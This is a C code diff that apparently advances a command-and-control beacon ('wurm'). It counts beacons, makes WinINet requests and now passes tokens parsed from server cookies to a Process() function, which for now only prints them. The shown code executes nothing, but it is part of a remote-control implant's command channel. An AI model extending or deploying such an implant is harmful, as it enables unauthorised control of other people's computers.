@@ -80,6 +80,11 @@ void Package(CHAR* buffer) {
         free(buffer);
 }
 
+void Process(CHAR* command, CHAR* input) {
+    printf("Processing command: %s\n", command);
+    printf("Command input: %s\n", input);
+}
+
 void Request() {
     // Set local variables
     HINTERNET hInternet; // Must be closed
@@ -87,13 +92,12 @@ void Request() {
     HINTERNET hRequest; // Must be closed
     CHAR* cookie = NULL;
     CHAR* query_buffer = NULL; 
-    CHAR* mod_cookie = NULL;
     DWORD read_buffer;
     DWORD buffer_length = 0;
     DWORD available_size = 0;  
     DWORD dw_error = GetLastError();
 
-    wurm.beacon.count += 1;
+    wurm.beacon.count += 1; // Note: move before process_cookie label once tested with new server refactor
 
     // Set handle to initialize wininet functions
     hInternet = InternetOpenA(wurm.http.user_agent, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
@@ -159,7 +163,7 @@ void Request() {
         printf("Error: %lu\n", dw_error);
     }
 
-    // Tokenize the cookie and either store or send to processed as a command
+    // Tokenize the cookie and either store or send to be processed as a command
     process_cookie:
         if (wurm.beacon.count <= 1) {
             CHAR* token = strtok(cookie, " ");
@@ -171,19 +175,22 @@ void Request() {
             }
         } else {
             CHAR* token = strtok(cookie, " ");
-            //if (strtok(NULL, " ") == NULL) {
-                //printf("hello");
-                //printf("Token: %s\n", token);
-                // Process(cookie, input);
-            //} else {
+            CHAR* input = NULL;
+            CHAR* cmd = token;
+            INT count = 0;
+            printf("Command found: %s\n", cmd);
             while (token != NULL) {
-                printf("Token: %s\n", token);
+                count += 1;
+                if (count == 1) {
+                    token = strtok(NULL, " ");
+                    continue;
+                } else {
+                    printf("Token: %s\n", token);
+                }
                 token = strtok(NULL, " ");
             }
                 
-                //CHAR* input = NULL;
-                // Process(cookie, input);
-            //}
+            Process(cmd, input);
         }
 
     // Clean up memory and handles
